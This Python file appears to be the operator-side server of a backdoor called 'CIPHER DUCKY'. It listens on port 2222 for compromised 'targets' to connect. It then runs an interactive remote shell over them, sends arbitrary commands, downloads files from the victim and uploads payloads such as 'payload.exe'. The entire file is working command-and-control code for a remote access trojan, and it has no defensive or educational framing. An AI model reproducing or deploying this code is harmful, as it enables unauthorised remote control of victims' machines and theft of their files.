import socket
import json
import os
import termcolor
from art import text2art
import signal
import sys
import hashlib
import time

HOST_IP = '0.0.0.0'
PORT = 2222
CHUNK_SIZE = 8192

def calculate_md5(filename):
    md5_hash = hashlib.md5()
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            md5_hash.update(chunk)
    return md5_hash.hexdigest()

def send_command(sock, data):
    try:
        jsondata = json.dumps(data)
        sock.sendall(jsondata.encode())
        return True
    except socket.error as e:
        print(termcolor.colored(f"\n[!] Error sending command: {e}", "red"))
        return False

def receive_output(sock, timeout=10):
    data = ''
    sock.settimeout(timeout)
    try:
        while True:
            try:
                chunk = sock.recv(1024).decode()
                if not chunk:
                    return None
                data += chunk
                return json.loads(data)
            except json.JSONDecodeError:
                continue
            except socket.timeout:
                print(termcolor.colored("\n[!] Timeout waiting for response", "yellow"))
                return None
    except Exception as e:
        print(termcolor.colored(f"\n[!] Error receiving output: {e}", "red"))
        return None
    finally:
        sock.settimeout(None)

def receive_file(sock, target_filename):
    try:
        # Get metadata from target
        metadata = receive_output(sock)
        if not metadata or isinstance(metadata, str):
            print(termcolor.colored("[!] Failed to receive file metadata", "red"))
            return False

        filesize = metadata['filesize']
        expected_md5 = metadata['md5']
        
        print(termcolor.colored(f"[*] Receiving file: {target_filename} ({filesize} bytes)", "yellow"))
        
        # Signal ready to receive
        send_command(sock, "READY")

        # Receive file in chunks
        md5_hash = hashlib.md5()
        bytes_received = 0
        start_time = time.time()
        
        with open(target_filename, 'wb') as f:
            while bytes_received < filesize:
                # Add timeout for each chunk
                if time.time() - start_time > 30:  # 30 second timeout
                    print(termcolor.colored("[!] File transfer timed out", "red"))
                    return False
                    
                remaining = filesize - bytes_received
                chunk_size = min(CHUNK_SIZE, remaining)
                chunk = sock.recv(chunk_size)
                
                if not chunk:
                    break
                    
                f.write(chunk)
                md5_hash.update(chunk)
                bytes_received += len(chunk)
                
                # Print progress
                progress = (bytes_received / filesize) * 100
                print(f"\rProgress: {progress:.1f}%", end="")

        print()  # New line after progress

        if bytes_received != filesize:
            print(termcolor.colored("[!] File transfer incomplete", "red"))
            return False

        received_md5 = md5_hash.hexdigest()
        if received_md5 != expected_md5:
            print(termcolor.colored("[!] File verification failed", "red"))
            print(f"Expected MD5: {expected_md5}")
            print(f"Received MD5: {received_md5}")
            return False
            
        print(termcolor.colored(f"[+] File {target_filename} downloaded successfully", "green"))
        return True

    except Exception as e:
        print(termcolor.colored(f"\n[!] Error receiving file: {str(e)}", "red"))
        return False

def send_file(sock, filename):
    try:
        if not os.path.exists(filename):
            print(termcolor.colored(f"[!] File {filename} not found", "red"))
            send_command(sock, f"[!] File {filename} not found")
            return False

        filesize = os.path.getsize(filename)
        md5_hash = calculate_md5(filename)
        
        metadata = {
            'filename': os.path.basename(filename),
            'filesize': filesize,
            'md5': md5_hash
        }
        send_command(sock, metadata)

        response = receive_output(sock)
        if response != "READY":
            print(termcolor.colored("[!] Target not ready to receive file", "red"))
            return False

        print(termcolor.colored(f"[*] Sending file: {filename} ({filesize} bytes)", "yellow"))
        bytes_sent = 0
        
        with open(filename, 'rb') as f:
            while bytes_sent < filesize:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break
                sock.sendall(chunk)
                bytes_sent += len(chunk)
                
                # Print progress
                progress = (bytes_sent / filesize) * 100
                print(f"\rProgress: {progress:.1f}%", end="")

        print()  # New line after progress

        if bytes_sent != filesize:
            print(termcolor.colored("[!] File transfer incomplete", "red"))
            return False

        result = receive_output(sock)
        if result and result.get('success'):
            print(termcolor.colored(result['message'], "green"))
            return True
        else:
            print(termcolor.colored("[!] File transfer failed", "red"))
            return False

    except Exception as e:
        print(termcolor.colored(f"\n[!] Error sending file: {str(e)}", "red"))
        return False

def print_help():
    help_text = """
Available Commands:
    help          - Show this help message
    :kill         - Terminate the backdoor connection
    clear         - Clear the terminal screen
    cd <path>     - Change directory on target
    pwd           - Show current directory on target
    download <file> - Download file from target
    upload <file>   - Upload file to target
    
File Transfer Examples:
    download hello.txt    - Download hello.txt from target
    upload payload.exe    - Upload payload.exe to target
    """
    print(termcolor.colored(help_text, "cyan"))

def shell(sock):
    while True:
        try:
            command = input(termcolor.colored("#-cipher-Ducky >> ", "blue")).strip()
            if not command:
                continue

            if command == "help":
                print_help()
                continue
                
            if command == "clear":
                os.system('cls' if os.name == 'nt' else 'clear')
                continue

            # Handle file transfers
            if command.startswith("download "):
                filename = command.split(" ", 1)[1].strip()
                if not send_command(sock, command):
                    continue
                receive_file(sock, filename)
                continue
                
            if command.startswith("upload "):
                filename = command.split(" ", 1)[1].strip()
                if not send_command(sock, command):
                    continue
                send_file(sock, filename)
                continue

            # Send the command to the target
            if not send_command(sock, command):
                print(termcolor.colored("[!] Failed to send command", "red"))
                continue

            # Handle response
            response = receive_output(sock)
            if response is None:
                print(termcolor.colored("[!] No response from target", "red"))
                break
            elif response == "PING":
                continue
            else:
                print(response)

        except KeyboardInterrupt:
            print(termcolor.colored("\n[!] Use ':kill' to terminate the session", "yellow"))
            continue
            
        except Exception as e:
            print(termcolor.colored(f"\n[!] Error in shell: {str(e)}", "red"))
            break

def signal_handler(sig, frame):
    print(termcolor.colored("\n[!] Server shutting down...", "red"))
    try:
        server.close()
    except:
        pass
    sys.exit(0)

def main():
    global server

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((HOST_IP, PORT))
        server.listen(5)
        print(termcolor.colored(f"[*] Server started on port {PORT}", "green"))
        print(termcolor.colored("[*] Waiting for incoming connections...", "yellow"))

        while True:
            client_socket, address = server.accept()
            print(termcolor.colored(f"\n[+] Target connected from {address[0]}:{address[1]}", "green"))

            ascii_art = text2art("CIPHER DUCKY", "random")
            print(termcolor.colored(ascii_art, "red"))
            print_help()

            shell(client_socket)
            
            print(termcolor.colored("\n[*] Session ended. Waiting for new connection...", "yellow"))
            try:
                client_socket.close()
            except:
                pass

    except Exception as e:
        print(termcolor.colored(f"[!] Critical error: {e}", "red"))
    finally:
        server.close()

signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    main()
